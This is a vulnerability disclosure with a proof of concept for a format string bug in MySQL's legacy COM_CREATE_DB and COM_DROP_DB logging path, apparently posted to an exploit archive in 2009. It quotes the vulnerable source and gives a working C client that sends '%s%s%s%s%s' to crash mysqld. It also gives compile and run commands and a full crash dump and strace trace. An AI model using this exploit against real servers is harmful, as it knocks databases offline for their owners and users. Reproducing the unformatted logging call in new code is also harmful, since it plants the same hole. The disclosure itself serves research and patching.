@@ -1,0 +1,342 @@
+MySQL (tested: Version 5.0.45 on CentOS (Linux)) Format String Vulnerability
+MySQL General Available (GA) Release is vulnerable.
+Latest MySQL Version is not vulnerable since the bug if ifdef'ed off.
+
+from mysql-5.0.75 source (mysql-5.0.75.tar.gz) in the file libmysqld/sql_parse.cc
+this source code is also included in mysql-4.0.0, mysql versions >= 4.0.0 are affected.
+
+function prototype: write(THD *thd, enumenum_server_command command, const char* format, ...) 
+function call: write(thd, command, packet);
+
+on line 2084:
+  case COM_CREATE_DB:				// QQ: To be removed
+    {
+      char *db=thd->strdup(packet), *alias;
+      HA_CREATE_INFO create_info;
+
+      statistic_increment(thd->status_var.com_stat[SQLCOM_CREATE_DB],
+			  &LOCK_status);
+      // null test to handle EOM
+      if (!db || !(alias= thd->strdup(db)) || check_db_name(db))
+      {
+	my_error(ER_WRONG_DB_NAME, MYF(0), db ? db : "NULL");
+	break;
+      }
+      if (check_access(thd,CREATE_ACL,db,0,1,0,is_schema_db(db)))
+	break;
+      [1] mysql_log.write(thd,command,packet);
+      bzero(&create_info, sizeof(create_info));
+      mysql_create_db(thd, (lower_case_table_names == 2 ? alias : db),
+                      &create_info, 0);
+      break;
+    }
+
+line 2105:
+  case COM_DROP_DB:				// QQ: To be removed
+    {
+      statistic_increment(thd->status_var.com_stat[SQLCOM_DROP_DB],
+			  &LOCK_status);
+      char *db=thd->strdup(packet);
+      /*  null test to handle EOM */
+      if (!db || check_db_name(db))
+      {
+	my_error(ER_WRONG_DB_NAME, MYF(0), db ? db : "NULL");
+	break;
+      }
+      if (check_access(thd,DROP_ACL,db,0,1,0,is_schema_db(db)))
+	break;
+      if (thd->locked_tables || thd->active_transaction())
+      {
+	my_message(ER_LOCK_OR_ACTIVE_TRANSACTION,
+                   ER(ER_LOCK_OR_ACTIVE_TRANSACTION), MYF(0));
+	break;
+      }
+      [2] mysql_log.write(thd,command,db); 
+      mysql_rm_db(thd, db, 0, 0);
+      break;
+    }
+
+at [1] and [2] there is a call to mysql_log.write() without 
+format string specifiers leading to a format string bug.
+authentication is required.
+
+COM_CREATE_DB and COM_DROP_DB are "legacy" code. Recent clients
+does not use this functions to create and drop databases.
+Older clients do. Even Newest GA version of mysqld is able to handle
+the requests though.
+    
+mysql logging has to be enabled. it seems acls are enforced, so
+create db or drop db privs may be required, though untested.
+--> my.cnf at [mysqld] log=/var/log/mysql.log for example
+
+PROOF OF CONCEPT WHICH CRASHES MYSQLD FOLLOWS
+MYSQLD RESTARTS IMMEDIATELY
+CAUSE: SIGNAL SEGV
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+---snip---
+#include <stdlib.h>
+#include <stdio.h>
+
+#define USE_OLD_FUNCTIONS
+#include <mysql/mysql.h>
+
+#define NullS           (char *) 0
+
+int
+main (int argc, char **argv)
+{
+  MYSQL *mysql = NULL;
+
+  mysql = mysql_init (mysql);
+
+  if (!mysql)
+    {
+      puts ("Init faild, out of memory?");
+      return EXIT_FAILURE;
+    }
+
+  if (!mysql_real_connect (mysql,       /* MYSQL structure to use */
+                           "localhost", /* server hostname or IP address */
+                           "monty",      /* mysql user */
+                           "montypython",  /* password */
+                           NULL,      /* default database to use, NULL for none */
+                           0,   /* port number, 0 for default */
+                           NULL,        /* socket file or named pipe name */
+                           CLIENT_FOUND_ROWS /* connection flags */ ))
+    {
+      puts ("Connect failed\n");
+    }
+  else
+    {
+      puts ("Connect OK\n");
+//      mysql_create_db(mysql, "%s%s%s%s%s");
+        simple_command(mysql, COM_CREATE_DB, argv[1], strlen(argv[1]), 0);
+
+    }
+
+  mysql_close (mysql);
+
+  return EXIT_SUCCESS;
+}
+---snip---
+
+reproduce:
+$gcc mysql_format.c -o mysql_format -lmysqlclient
+$./mysql_format %s%s%s%s%s
+
+
+Debugging output follows - Crashdump and strace output
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Version: '5.0.45-log'  socket: '/var/lib/mysql/mysql.sock'  port: 3306  Source distribution
+090620  1:53:52 - mysqld got signal 11;
+This could be because you hit a bug. It is also possible that this binary
+or one of the libraries it was linked against is corrupt, improperly built,
+or misconfigured. This error can also be caused by malfunctioning hardware.
+We will try our best to scrape up some info that will hopefully help diagnose
+the problem, but since we have already crashed, something is definitely wrong
+and this may fail.
+
+key_buffer_size=8388600
+read_buffer_size=131072
+max_used_connections=1
+max_connections=100
+threads_connected=1
+It is possible that mysqld could use up to
+key_buffer_size + (read_buffer_size + sort_buffer_size)*max_connections = 225791 K
+bytes of memory
+Hope that's ok; if not, decrease some variables in the equation.
+
+thd=0x8aea8a8
+Attempting backtrace. You can use the following information to find out
+where mysqld died. If you see no messages after this, something went
+terribly wrong...
+Cannot determine thread, fp=0xb038d7ec, backtrace may not be correct.
+Stack range sanity check OK, backtrace follows:
+0x8187393
+0xb7be8afb
+0x8208dc4
+0x81a55e2
+0x81a58b7
+0x81a6487
+0xb7e2a33a
+0xb7c4b5ce
+New value of fp=(nil) failed sanity check, terminating stack trace!
+Please read http://dev.mysql.com/doc/mysql/en/using-stack-trace.html and follow instructions on how to resolve the stack trace. Resolved
+stack trace is much more helpful in diagnosing the problem, so please do
+resolve it
+Trying to get some variables.
+Some pointers may be invalid and cause the dump to abort...
+thd->query at (nil)  is invalid pointer
+thd->thread_id=1
+The manual page at http://www.mysql.com/doc/en/Crashing.html contains
+information that should help you find out what is causing the crash.
+
+Number of processes running now: 0
+090620 01:53:52  mysqld restarted
+090620  1:53:52  InnoDB: Started; log sequence number 0 4876777
+090620  1:53:52 [Note] /usr/libexec/mysqld: ready for connections.
+Version: '5.0.45-log'  socket: '/var/lib/mysql/mysql.sock'  port: 3306  Source distribution
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+26454 futex(0x8a6ff90, FUTEX_WAIT, 1, NULL <unfinished ...>
+26453 select(14, [11 13], NULL, NULL, NULL <unfinished ...>
+26455 futex(0x8a70000, FUTEX_WAIT, 5, NULL <unfinished ...>
+26456 futex(0x8a70070, FUTEX_WAIT, 3, NULL <unfinished ...>
+26457 futex(0x8a700e0, FUTEX_WAIT, 1, NULL <unfinished ...>
+26459 select(0, NULL, NULL, NULL, {0, 55000} <unfinished ...>
+26460 select(0, NULL, NULL, NULL, {0, 953000} <unfinished ...>
+26461 futex(0x872a630, FUTEX_WAIT, 1, NULL <unfinished ...>
+26462 rt_sigtimedwait([HUP QUIT ALRM TERM TSTP],  <unfinished ...>
+26463 futex(0x86e2044, FUTEX_WAIT, 1, NULL <unfinished ...>
+26459 <... select resumed> )            = 0 (Timeout)
+26459 time(NULL)                        = 1245456538
+26459 select(0, NULL, NULL, NULL, {1, 0} <unfinished ...>
+26460 <... select resumed> )            = 0 (Timeout)
+26460 time(NULL)                        = 1245456538
+26460 select(0, NULL, NULL, NULL, {2, 0} <unfinished ...>
+26459 <... select resumed> )            = 0 (Timeout)
+26459 time(NULL)                        = 1245456539
+26459 select(0, NULL, NULL, NULL, {1, 0}) = 0 (Timeout)
+26459 time(NULL)                        = 1245456540
+26459 select(0, NULL, NULL, NULL, {1, 0} <unfinished ...>
+26460 <... select resumed> )            = 0 (Timeout)
+26460 time(NULL)                        = 1245456540
+26460 select(0, NULL, NULL, NULL, {2, 0} <unfinished ...>
+26459 <... select resumed> )            = 0 (Timeout)
+26459 time(NULL)                        = 1245456541
+26459 select(0, NULL, NULL, NULL, {1, 0}) = 0 (Timeout)
+26459 time(NULL)                        = 1245456542
+26459 select(0, NULL, NULL, NULL, {1, 0} <unfinished ...>
+26460 <... select resumed> )            = 0 (Timeout)
+26460 time(NULL)                        = 1245456542
+26460 select(0, NULL, NULL, NULL, {2, 0} <unfinished ...>
+26459 <... select resumed> )            = 0 (Timeout)
+26459 time(NULL)                        = 1245456543
+26459 select(0, NULL, NULL, NULL, {1, 0}) = 0 (Timeout)
+26459 time(NULL)                        = 1245456544
+26459 time(NULL)                        = 1245456544
+26459 select(0, NULL, NULL, NULL, {1, 0} <unfinished ...>
+26460 <... select resumed> )            = 0 (Timeout)
+26460 time(NULL)                        = 1245456544
+26460 select(0, NULL, NULL, NULL, {2, 0} <unfinished ...>
+26459 <... select resumed> )            = 0 (Timeout)
+26459 time(NULL)                        = 1245456545
+26459 select(0, NULL, NULL, NULL, {1, 0}) = 0 (Timeout)
+26459 time(NULL)                        = 1245456546
+26459 select(0, NULL, NULL, NULL, {1, 0} <unfinished ...>
+26460 <... select resumed> )            = 0 (Timeout)
+26460 time(NULL)                        = 1245456546
+26460 select(0, NULL, NULL, NULL, {2, 0} <unfinished ...>
+26459 <... select resumed> )            = 0 (Timeout)
+26459 time(NULL)                        = 1245456547
+26459 select(0, NULL, NULL, NULL, {1, 0} <unfinished ...>
+26453 <... select resumed> )            = 1 (in [13])
+26453 fcntl64(13, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+26453 accept(13, {sa_family=AF_FILE, path="ÿ¿"}, [2]) = 26
+26453 fcntl64(13, F_SETFL, O_RDWR)      = 0
+26453 getsockname(26, {sa_family=AF_FILE, path="/var/lib/mysql"}, [28]) = 0
+26453 fcntl64(26, F_SETFL, O_RDONLY)    = 0
+26453 fcntl64(26, F_GETFL)              = 0x2 (flags O_RDWR)
+26453 fcntl64(26, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+26453 setsockopt(26, SOL_IP, IP_TOS, [8], 4) = -1 EOPNOTSUPP (Operation not supported)
+26453 time(NULL)                        = 1245456547
+26453 mmap2(NULL, 200704, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb035e000
+26453 mprotect(0xb035e000, 4096, PROT_NONE) = 0
+26453 clone(child_stack=0xb038e494, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, parent_tidptr=0xb038ebd8, {entry_number:6, base_addr:0xb038eb90, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}, child_tidptr=0xb038ebd8) = 16147
+26453 select(14, [11 13], NULL, NULL, NULL <unfinished ...>
+16147 time(NULL)                        = 1245456547
+16147 rt_sigprocmask(SIG_UNBLOCK, [], [HUP INT QUIT PIPE ALRM TERM TSTP], 8) = 0
+16147 setsockopt(26, SOL_SOCKET, SO_KEEPALIVE, [1], 4) = 0
+16147 write(26, "8\0\0\0\n5.0.45-log\0\1\0\0\0]/mZZ46R\0,\242\300"..., 60) = 60
+16147 read(26, 0x8b19ae0, 4)            = -1 EAGAIN (Resource temporarily unavailable)
+16147 time(NULL)                        = 1245456547
+16147 rt_sigprocmask(SIG_BLOCK, ~[RTMIN RT_1], [HUP INT QUIT PIPE ALRM TERM TSTP], 8) = 0
+16147 tgkill(26453, 26462, SIGALRM)     = 0
+26462 <... rt_sigtimedwait resumed> 0, 0, 8) = 14
+16147 rt_sigprocmask(SIG_SETMASK, [HUP INT QUIT PIPE ALRM TERM TSTP],  <unfinished ...>
+26462 rt_sigprocmask(SIG_SETMASK, ~[RTMIN RT_1],  <unfinished ...>
+16147 <... rt_sigprocmask resumed> NULL, 8) = 0
+26462 <... rt_sigprocmask resumed> [HUP INT QUIT PIPE ALRM TERM TSTP], 8) = 0
+16147 fcntl64(26, F_SETFL, O_RDWR <unfinished ...>
+26462 time( <unfinished ...>
+16147 <... fcntl64 resumed> )           = 0
+26462 <... time resumed> NULL)          = 1245456547
+16147 read(26,  <unfinished ...>
+26462 alarm(5)                          = 0
+26462 rt_sigprocmask(SIG_SETMASK, [HUP INT QUIT PIPE ALRM TERM TSTP], NULL, 8) = 0
+26462 rt_sigtimedwait([HUP QUIT ALRM TERM TSTP],  <unfinished ...>
+16147 <... read resumed> "&\0\0\1", 4)  = 4
+16147 read(26, "\207\242\0\0\0\0\0@\10\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 38) = 38
+16147 rt_sigprocmask(SIG_BLOCK, ~[RTMIN RT_1], [HUP INT QUIT PIPE ALRM TERM TSTP], 8) = 0
+16147 rt_sigprocmask(SIG_SETMASK, [HUP INT QUIT PIPE ALRM TERM TSTP], NULL, 8) = 0
+16147 fcntl64(26, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+16147 time(NULL)                        = 1245456547
+16147 write(3, "090620  2:09:07\t      1 Connect "..., 55) = 55
+16147 write(26, "\7\0\0\2\0\0\0\2\0\0\0", 11) = 11
+16147 time(NULL)                        = 1245456547
+16147 read(26, 0x8b19ae0, 4)            = -1 EAGAIN (Resource temporarily unavailable)
+16147 time(NULL)                        = 1245456547
+16147 rt_sigprocmask(SIG_BLOCK, ~[RTMIN RT_1], [HUP INT QUIT PIPE ALRM TERM TSTP], 8) = 0
+16147 tgkill(26453, 26462, SIGALRM)     = 0
+16147 rt_sigprocmask(SIG_SETMASK, [HUP INT QUIT PIPE ALRM TERM TSTP], NULL, 8) = 0
+16147 fcntl64(26, F_SETFL, O_RDWR)      = 0
+16147 read(26,  <unfinished ...>
+26462 <... rt_sigtimedwait resumed> 0, 0, 8) = 14
+16147 <... read resumed> "\v\0\0\0", 4) = 4
+16147 read(26, "\5%s%s%s%s%s", 11)      = 11
+16147 rt_sigprocmask(SIG_BLOCK, ~[RTMIN RT_1], [HUP INT QUIT PIPE ALRM TERM TSTP], 8) = 0
+16147 rt_sigprocmask(SIG_SETMASK, [HUP INT QUIT PIPE ALRM TERM TSTP], NULL, 8) = 0
+16147 fcntl64(26, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+16147 time(NULL)                        = 1245456547
+16147 --- SIGSEGV (Segmentation fault) @ 0 (0) ---
+16147 time(NULL)                        = 1245456547
+16147 write(2, "090620  2:09:07 - mysqld got sig"..., 266) = 266
+16147 write(2, "We will try our best to scrape u"..., 176) = 176
+16147 write(2, "key_buffer_size=8388600\n", 24) = 24
+16147 write(2, "read_buffer_size=131072\n", 24) = 24
+16147 write(2, "max_used_connections=1\n", 23) = 23
+16147 write(2, "max_connections=100\n", 20) = 20
+16147 write(2, "threads_connected=1\n", 20) = 20
+16147 write(2, "It is possible that mysqld could"..., 143) = 143
+16147 write(2, "Hope that\'s ok; if not, decrease"..., 66) = 66
+16147 write(2, "thd=0x8aea8a8\n", 14)   = 14
+16147 write(2, "Attempting backtrace. You can us"..., 159) = 159
+16147 write(2, "Cannot determine thread, fp=0xb0"..., 70) = 70
+16147 write(2, "Stack range sanity check OK, bac"..., 48) = 48
+16147 write(2, "0x8187393\n", 10)       = 10
+16147 write(2, "0xb7be8afb\n", 11)      = 11
+16147 write(2, "0x8208dc4\n", 10)       = 10
+16147 write(2, "0x81a55e2\n", 10)       = 10
+16147 write(2, "0x81a58b7\n", 10)       = 10
+16147 write(2, "0x81a6487\n", 10)       = 10
+16147 write(2, "0xb7e2a33a\n", 11)      = 11
+16147 write(2, "0xb7c4b5ce\n", 11)      = 11
+16147 write(2, "New value of fp=(nil) failed san"..., 68) = 68
+16147 write(2, "Please read http://dev.mysql.com"..., 222) = 222
+16147 write(2, "Trying to get some variables.\nSo"..., 90) = 90
+16147 write(2, "thd->query at (nil) ", 20) = 20
+16147 write(2, " is invalid pointer\n", 20) = 20
+16147 write(2, "thd->thread_id=1\n", 17) = 17
+16147 write(2, "The manual page at http://www.my"..., 139) = 139
+16147 exit_group(1)                     = ?
+26462 rt_sigprocmask(SIG_SETMASK, ~[RTMIN RT_1],  <unfinished ...>
+26463 <... futex resumed> )             = -1 EINTR (Interrupted system call)
+26459 <... select resumed> )            = ? ERESTARTNOHAND (To be restarted)
+26453 <... select resumed> )            = ? ERESTARTNOHAND (To be restarted)
+26454 <... futex resumed> )             = -1 EINTR (Interrupted system call)
+26455 <... futex resumed> )             = -1 EINTR (Interrupted system call)
+26456 <... futex resumed> )             = -1 EINTR (Interrupted system call)
+26457 <... futex resumed> )             = -1 EINTR (Interrupted system call)
+26461 <... futex resumed> )             = -1 EINTR (Interrupted system call)
+26460 <... select resumed> )            = ? ERESTARTNOHAND (To be restarted)
+26462 <... rt_sigprocmask resumed> [HUP INT QUIT PIPE ALRM TERM TSTP], 8) = 0
+
+With Kind Regards,
+
+Nikolaos Rangos
+E-Mail: kcope[at]googlemail.com
+
+# milw0rm.com [2009-07-09]
